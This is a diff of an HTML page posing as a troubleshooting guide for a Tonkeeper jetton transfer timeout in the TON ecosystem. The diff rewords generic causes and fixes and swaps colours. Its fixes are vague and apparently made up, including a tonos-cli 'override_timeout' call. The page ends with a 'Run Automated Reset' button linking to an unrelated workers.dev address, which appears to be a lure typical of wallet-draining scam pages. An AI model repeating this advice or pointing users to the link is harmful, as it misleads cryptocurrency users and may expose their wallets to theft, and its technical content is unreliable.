@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
+<li>Users of the TON ecosystem are experiencing a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transaction process due to a timeout in the loop that manages the transfer.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, insufficient gas, or faulty smart contract configuration, leading to a deadlock in the transaction processing.</li>
+<li>The error occurs due to a misconfiguration or overload in the Tonkeeper system, leading to an inability to complete the jetton transfer within the allocated time frame, thus resulting in a timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for the transaction to ensure sufficient resources are allocated.</li>
-<li>Verify the smart contract configuration to ensure it is correctly set up for jetton transfers.</li>
-<li>Use the following command to override the default timeout settings:</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Increase the timeout value to allow more time for the transaction to complete.</li>
+<li>Check the Tonkeeper node's health and ensure it is properly configured.</li>
+<li>Use the following command to manually override the transfer loop:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>override_timeout<span class="w"> </span><span class="s1">&#39;{&quot;timeout&quot;: 300}&#39;</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;jetton_address&gt;<span class="w"> </span>transfer<span class="w"> </span><span class="s1">&#39;{&quot;dest&quot;:&quot;&lt;destination_address&gt;&quot;,&quot;value&quot;:&lt;amount&gt;}&#39;</span><span class="w"> </span>--timeout<span class="w"> </span><span class="m">60</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
+<p>Consider utilizing an external console for more complex troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of TON ecosystem and Tonkeeper functionality</li>
-<li>Familiarity with smart contract configuration and gas management</li>
-<li>Access to the <code>tonos-cli</code> command-line tool</li>
+<li>Familiarity with the TON ecosystem and its tools</li>
+<li>Access to the Tonkeeper system and its configuration</li>
+<li>Understanding of jetton transfer mechanisms in TON</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
